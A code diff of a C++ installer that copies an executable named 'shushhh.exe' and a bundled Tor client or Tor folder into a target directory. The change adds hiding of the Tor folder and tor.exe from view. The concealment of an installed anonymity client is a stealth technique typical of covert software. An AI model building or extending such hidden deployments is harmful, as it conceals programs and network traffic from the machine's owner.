@@ -44,11 +44,19 @@ int main() {
 
     // Assuming installer is run from the build folder, shushhh.exe should be next to it.
     std::string shushhh_src = "shushhh.exe";
-    std::string tor_src = "tor.exe";
-    
-    // Fallbacks if they placed Tor in a subfolder
-    if (!fs::exists(tor_src) && fs::exists("tor/tor.exe")) {
+    std::string tor_src = "tor";
+    bool is_tor_dir = false;
+
+    // Fallbacks if they just have tor.exe or a tor/ folder
+    if (fs::exists("tor") && fs::is_directory("tor")) {
+        tor_src = "tor";
+        is_tor_dir = true;
+    } else if (fs::exists("tor.exe")) {
+        tor_src = "tor.exe";
+        is_tor_dir = false;
+    } else if (fs::exists("tor/tor.exe")) {
         tor_src = "tor/tor.exe";
+        is_tor_dir = false;
     }
 
     if (!fs::exists(shushhh_src)) {
@@ -58,7 +66,7 @@ int main() {
     }
 
     std::string dest_shushhh = target_dir + "shushhh.exe";
-    std::string dest_tor = target_dir + "tor.exe";
+    std::string dest_tor = is_tor_dir ? target_dir + "tor" : target_dir + "tor.exe";
 
     std::cout << "[*] Copying " << shushhh_src << " to " << dest_shushhh << "...\n";
     try {
@@ -72,9 +80,18 @@ int main() {
     if (fs::exists(tor_src)) {
         std::cout << "[*] Copying " << tor_src << " to " << dest_tor << "...\n";
         try {
-            fs::copy_file(tor_src, dest_tor, fs::copy_options::overwrite_existing);
+            if (is_tor_dir) {
+                fs::copy(tor_src, dest_tor, fs::copy_options::overwrite_existing | fs::copy_options::recursive);
+                // Hide the whole folder and tor.exe inside
+                hide_file(dest_tor);
+                if (fs::exists(dest_tor + "/tor.exe")) {
+                    hide_file(dest_tor + "/tor.exe");
+                }
+            } else {
+                fs::copy_file(tor_src, dest_tor, fs::copy_options::overwrite_existing);
+                hide_file(dest_tor);
+            }
             std::cout << "[+] Copied successfully.\n";
-            hide_file(dest_tor);
         } catch (const fs::filesystem_error& e) {
             std::cerr << "[-] Copy failed: " << e.what() << "\n";
         }
